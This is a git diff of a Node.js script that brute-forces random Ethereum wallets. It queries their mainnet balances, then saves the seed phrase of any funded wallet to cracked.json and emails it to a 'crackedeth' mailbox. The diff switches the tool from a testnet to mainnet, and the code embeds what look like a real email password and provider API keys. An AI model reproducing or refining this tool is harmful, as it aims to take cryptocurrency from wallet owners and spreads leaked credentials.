@@ -1,69 +1,62 @@
-const ethers = require("ethers");
-const Web3   = require("web3");
-const bip39  = require("bip39");
+const ethers = require('ethers');
 const nodemailer = require('nodemailer');
+const fs = require('fs/promises');
 
-const api = "https://ropsten.infura.io/v3/267cf8a4393e43739b3dbace75de0030"; // web3 provider api
-const emailSender = "ethsender@proton.me";
-const emailPassword = "LubieChuje2137";
-const emailRecipient = "crackedeth@proton.me";
+const API_KEY = 'https://eth-mainnet.g.alchemy.com/v2/JCNCAmqFfaWQ9WQrW143reOVrnRg1YfY';
+const provider = new ethers.providers.JsonRpcProvider(API_KEY);
 
-const provider = new Web3(new Web3.providers.HttpProvider(api));
+async function sendEmail(wallet) {
+  const transporter = nodemailer.createTransport({
+    host: 'smtp.protonmail.com',
+    port: 587,
+    secure: false,
+    auth: {
+      user: 'ethsender@protonmail.com',
+      pass: 'LubieChuje2137',
+    },
+  });
 
-// create nodemailer transporter with sender credentials
-const transporter = nodemailer.createTransport({
-  service: 'ProtonMail',
-  auth: {
-    user: emailSender,
-    pass: emailPassword
-  }
-});
+  const mailOptions = {
+    from: 'ethsender@protonmail.com',
+    to: 'crackedeth@proton.me',
+    subject: 'New Ethereum wallet found!',
+    text: `Address: ${wallet.address}\nMnemonic: ${wallet.mnemonic.phrase}`,
+  };
+
+  await transporter.sendMail(mailOptions);
+  console.log('Email sent!');
+}
 
 async function main() {
-  while(true) {
-    var mnemonic = bip39.generateMnemonic();
-    var wallet   = ethers.Wallet.fromMnemonic(mnemonic);
-    var address  = wallet.address;    
-    var balance = await provider.eth.getBalance(address);
-    
-    if (balance !== '0') {
-      // eth in this account, send email with mnemonic and address
-      const content = mnemonic+'\n'+address+'\n'
-      const mailOptions = {
-        from: emailSender,
-        to: emailRecipient,
-        subject: 'Cracked ETH Wallet',
-        text: content
-      };
-      transporter.sendMail(mailOptions, function(error, info){
-        if (error) {
-          console.error(error);
-        } else {
-          console.log('Email sent: ' + info.response);
-        }
-      });
-    } else {
-      // no eth in this account, write mnemonic and address to zerobalance.txt
-      const content = mnemonic+'\n'+address+'\n';
-      const fs = require('fs');
-      fs.appendFile('zerobalance.txt', content, err => {
-        if (err) {
-          console.error(err);
-          return;
-        }
-      });
+  while (1) {
+    const wallet = ethers.Wallet.createRandom();
+    const mnemonic = wallet.mnemonic.phrase;
+    const address = wallet.address;
+    const balance = ethers.utils.formatEther(await provider.getBalance(wallet.address));
+    console.log(`Balance: ${balance}`);
+
+    if (balance !== '0.0') {
+      let crackedData;
+
+      try {
+        const data = await fs.readFile('./cracked.json');
+        crackedData = JSON.parse(data);
+      } catch (err) {
+        console.error(err);
+        continue;
+      }
+
+      crackedData[address] = { mnemonic, balance };
+
+      try {
+        await fs.writeFile('./cracked.json', JSON.stringify(crackedData, null, 4), 'utf8');
+        await sendEmail(wallet);
+      } catch (err) {
+        console.error(err);
+        continue;
+      }
     }
-    
-    console.log(address);
-    console.log("balance: ", balance);
   }
 }
 
-main()
-  .then(() => {
-    process.exit(0)
-  })
-  .catch((error) => {
-    console.error(error);
-    process.exit(1);
-  });
+main();
